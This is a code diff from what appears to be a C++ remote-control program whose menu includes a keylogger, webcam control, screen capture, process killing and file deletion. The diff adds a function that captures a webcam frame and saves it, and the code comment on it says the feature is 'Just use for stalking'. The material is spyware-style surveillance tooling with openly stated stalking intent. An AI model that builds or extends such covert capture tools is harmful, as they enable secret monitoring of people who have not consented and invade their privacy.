@@ -110,6 +110,7 @@ map<string, map<string, function<void()>>> setupHandlers() {
         {
             "capture", 
             {
+                { "camera", captureCamera },
                 { "screen", captureScreen }
             }
         }
@@ -125,7 +126,7 @@ string getInstruction() {
         << "|   stop    [app|service]      [processID|serviceName]   |\n"
         << "|   power   [shutdown|restart]                           |\n"
         << "|   file    [copy|delete]      srcPath [desPath]         |\n"
-        << "|   capture screen                                       |\n"
+        << "|   capture [camera|screen]                              |\n"
         << "|   start   [camera|keylogger]                           |\n"
         << "|   stop    [camera|keylogger]                           |\n"
         << "|   exit                                                 |\n"
@@ -445,6 +446,18 @@ void startCamera() {
     }
     else {
         out << "\nFailed to open webcam.\n";
+    }
+}
+
+void captureCamera() {
+    if (cap && cap->isOpened()) {
+        Mat frame;
+        *cap >> frame;
+        imwrite(webcamCapturePath, frame); // Just use for stalking =))
+        out << "\nWebcam captured successfully.\n\nSee more in file " << webcamCapturePath.substr(webcamCapturePath.find_last_of('/') + 1);
+    }
+    else {
+        out << "\nError: Webcam is not open.\n";
     }
 }
 
